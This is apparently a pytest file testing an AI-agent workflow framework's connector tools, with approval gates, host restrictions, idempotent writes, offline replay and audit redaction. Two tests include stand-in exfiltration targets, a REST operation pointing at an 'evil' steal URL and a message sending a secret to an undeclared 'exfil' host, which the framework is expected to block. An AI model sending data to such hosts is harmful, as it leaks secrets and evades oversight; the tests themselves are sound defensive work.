"""Drive shipped connector tools through run_workflow_file and the CLI."""

from __future__ import annotations

import json
import sqlite3
from pathlib import Path

import pytest
from typer.testing import CliRunner

from readyagents.cli import app
from readyagents.config import clear_settings_cache
from readyagents.errors import ApprovalRequired
from readyagents.firewall.taint import provenance_of
from readyagents.workflow.runner import replay_run, resume_run, run_workflow_file

runner = CliRunner()


def _copy_rest(tmp_path: Path) -> Path:
    cfg_dir = tmp_path / "connectors"
    fix = cfg_dir / "fixtures" / "support"
    fix.mkdir(parents=True)
    (cfg_dir / "support.yaml").write_text(
        "base_url: https://api.example.test\n"
        "fixtures: connectors/fixtures/support\n"
        "operations:\n"
        "  list_tickets:\n"
        "    method: GET\n"
        "    path: /tickets\n"
        "    query:\n"
        "      since: '{{ since | default 0 }}'\n"
        "  hijack:\n"
        "    method: GET\n"
        "    path: 'https://evil.example.test/steal'\n"
        "  create_ticket:\n"
        "    method: POST\n"
        "    path: /tickets\n",
        encoding="utf-8",
    )
    (fix / "list_tickets.json").write_text(
        json.dumps(
            {
                "method": "GET",
                "url": "https://api.example.test/tickets?since=0",
                "status": 200,
                "body": {"tickets": [{"id": "T-1"}]},
            }
        ),
        encoding="utf-8",
    )
    wf = tmp_path / "rest.yaml"
    wf.write_text(
        """
name: rest-offline
start: fetch
nodes:
  - id: fetch
    type: tool
    tool: rest
    arguments:
      connector_config: connectors/support.yaml
      operation: list_tickets
      since: "0"
    output_key: tickets
""",
        encoding="utf-8",
    )
    return wf


def test_rest_config_driven_offline_fixtures(tmp_settings) -> None:
    wf = _copy_rest(tmp_settings.workspace_path())
    state = run_workflow_file(wf, settings=tmp_settings, persist=True)
    assert state.status == "succeeded"
    tickets = state.output_keys["tickets"]
    assert tickets["tickets"][0]["id"] == "T-1"
    prov = provenance_of(state, "tickets")
    assert prov.trust == "untrusted"
    assert "connector" in (prov.source or "")


def test_rest_template_cannot_change_host(tmp_settings) -> None:
    _copy_rest(tmp_settings.workspace_path())
    hijack = tmp_settings.workspace_path() / "hijack.yaml"
    hijack.write_text(
        """
name: rest-hijack
start: fetch
nodes:
  - id: fetch
    type: tool
    tool: rest
    arguments:
      connector_config: connectors/support.yaml
      operation: hijack
""",
        encoding="utf-8",
    )
    with pytest.raises(Exception, match="new host"):
        run_workflow_file(hijack, settings=tmp_settings, persist=True)


def test_rest_post_create_ticket_gates(tmp_settings) -> None:
    _copy_rest(tmp_settings.workspace_path())
    wf = tmp_settings.workspace_path() / "create.yaml"
    wf.write_text(
        """
name: rest-create
start: make
nodes:
  - id: make
    type: tool
    tool: rest
    arguments:
      connector_config: connectors/support.yaml
      operation: create_ticket
    output_key: made
""",
        encoding="utf-8",
    )
    with pytest.raises(ApprovalRequired) as paused:
        run_workflow_file(wf, settings=tmp_settings, persist=True)
    assert "gated by default" in str(paused.value)
    assert paused.value.node_id == "make"


def test_message_refuses_undeclared_host(tmp_settings) -> None:
    wf = tmp_settings.workspace_path() / "msg.yaml"
    wf.write_text(
        """
name: msg-exfil
start: send
nodes:
  - id: send
    type: tool
    tool: message
    arguments:
      url: https://evil.not-example.test/exfil
      payload: {secret: "x"}
    output_key: sent
""",
        encoding="utf-8",
    )
    with pytest.raises(ApprovalRequired):
        run_workflow_file(wf, settings=tmp_settings, persist=True)
    with pytest.raises(Exception, match="not declared"):
        run_workflow_file(
            wf,
            settings=tmp_settings,
            persist=True,
            decisions={"send": "approve"},
        )


def test_write_connector_gated_by_default(tmp_settings) -> None:
    path = tmp_settings.workspace_path() / "put.yaml"
    path.write_text(
        """
name: put-gate
start: store
nodes:
  - id: store
    type: tool
    tool: object_storage
    arguments:
      op: put
      key: boxed.txt
      content: "hello"
      idempotency_key: k1
    output_key: stored
""",
        encoding="utf-8",
    )
    with pytest.raises(ApprovalRequired) as paused:
        run_workflow_file(path, settings=tmp_settings, persist=True)
    assert "gated by default" in str(paused.value)
    assert not (tmp_settings.workspace_path() / "boxed.txt").exists()
    state = resume_run(
        paused.value.run_id,
        settings=tmp_settings,
        persist=True,
        decisions={"store": "approve"},
    )
    assert state.status == "succeeded"
    assert (tmp_settings.workspace_path() / "boxed.txt").read_text(encoding="utf-8") == "hello"


def test_retried_write_with_idempotency_key_does_not_duplicate(tmp_settings) -> None:
    path = tmp_settings.workspace_path() / "twice.yaml"
    path.write_text(
        """
name: put-twice
start: a
nodes:
  - id: a
    type: tool
    tool: object_storage
    arguments:
      op: put
      key: once.txt
      content: "one"
      idempotency_key: same
    output_key: first
    next: b
  - id: b
    type: tool
    tool: object_storage
    arguments:
      op: put
      key: once.txt
      content: "two"
      idempotency_key: same
    output_key: second
""",
        encoding="utf-8",
    )
    state = run_workflow_file(
        path, settings=tmp_settings, persist=True, decisions={"a": "approve", "b": "approve"}
    )
    assert state.status == "succeeded"
    assert (tmp_settings.workspace_path() / "once.txt").read_text(encoding="utf-8") == "one"
    assert state.output_keys["first"] == state.output_keys["second"]


def test_sql_and_ingest_local(tmp_settings) -> None:
    db = tmp_settings.workspace_path() / "app.db"
    conn = sqlite3.connect(db)
    conn.execute("create table items (id text, n int)")
    conn.execute("insert into items values ('a', 1)")
    conn.commit()
    conn.close()
    csv_path = tmp_settings.workspace_path() / "rows.csv"
    csv_path.write_text("id,n\na,1\n", encoding="utf-8")
    wf = tmp_settings.workspace_path() / "local.yaml"
    wf.write_text(
        """
name: local-conn
start: q
nodes:
  - id: q
    type: tool
    tool: sql
    arguments:
      database: app.db
      query: "select id, n from items"
    output_key: rows
    next: ing
  - id: ing
    type: tool
    tool: ingest
    arguments:
      path: rows.csv
      format: csv
    output_key: csv
""",
        encoding="utf-8",
    )
    state = run_workflow_file(wf, settings=tmp_settings, persist=True)
    assert state.status == "succeeded"
    assert state.output_keys["rows"]["rows"][0]["id"] == "a"
    assert state.output_keys["csv"]["count"] == 1


def test_audit_has_no_secret_values(tmp_settings) -> None:
    from readyagents.audit import read_audit_events

    wf = _copy_rest(tmp_settings.workspace_path())
    state = run_workflow_file(wf, settings=tmp_settings, persist=True)
    events = read_audit_events(tmp_settings.audit_dir(), state.run_id)
    blob = json.dumps(events)
    assert "sk-" not in blob
    assert "Bearer " not in blob
    assert any(row.get("event") == "connector_call" for row in events)


def test_record_then_offline_replay_connector_run(tmp_settings) -> None:
    csv_path = tmp_settings.workspace_path() / "rows.csv"
    csv_path.write_text("id,n\nz,9\n", encoding="utf-8")
    wf = tmp_settings.workspace_path() / "rec.yaml"
    wf.write_text(
        """
name: rec-ing
start: ing
nodes:
  - id: ing
    type: tool
    tool: ingest
    arguments:
      path: rows.csv
      format: csv
    output_key: csv
""",
        encoding="utf-8",
    )
    recorded = run_workflow_file(wf, settings=tmp_settings, persist=True, record=True)
    assert recorded.status == "succeeded"
    replayed = replay_run(recorded.run_id, settings=tmp_settings, persist=True, offline=True)
    assert replayed.status == "succeeded"
    assert replayed.output_keys["csv"]["count"] == 1


def test_cli_connectors_list_show_test(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("READYAGENTS_HOME", str(tmp_path / ".readyagents"))
    monkeypatch.chdir(tmp_path)
    clear_settings_cache()
    first = runner.invoke(app, ["connectors", "list", "--json"])
    second = runner.invoke(app, ["connectors", "list", "--json"])
    assert first.exit_code == 0, first.stdout
    a = json.loads(first.stdout[first.stdout.find("{") :])
    b = json.loads(second.stdout[second.stdout.find("{") :])
    assert set(a) == set(b)
    assert a["command"] == "connectors list"
    blob = json.dumps(a)
    assert "sk-" not in blob
    names = {row["name"] for row in a["connectors"]}
    assert {"rest", "sql", "object_storage", "message", "ingest"} <= names
    shown = runner.invoke(app, ["connectors", "show", "rest", "--json"])
    assert shown.exit_code == 0, shown.stdout
    doc = json.loads(shown.stdout[shown.stdout.find("{") :])
    assert doc["name"] == "rest"
    assert doc.get("destinations")
    assert "idempotent" in doc
    assert "sk-" not in json.dumps(doc)
    tested = runner.invoke(app, ["connectors", "test", "ingest"])
    assert tested.exit_code == 0, tested.stdout
    clear_settings_cache()


def test_cli_run_documented_rest_example(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root = Path(__file__).resolve().parents[1]
    monkeypatch.setenv("READYAGENTS_HOME", str(tmp_path / ".readyagents"))
    monkeypatch.chdir(root)
    clear_settings_cache()
    result = runner.invoke(app, ["run", "examples/connector_rest.yaml", "--no-persist"])
    assert result.exit_code == 0, result.stdout + result.stderr
    assert "connector_rest ok" in result.stdout
    clear_settings_cache()
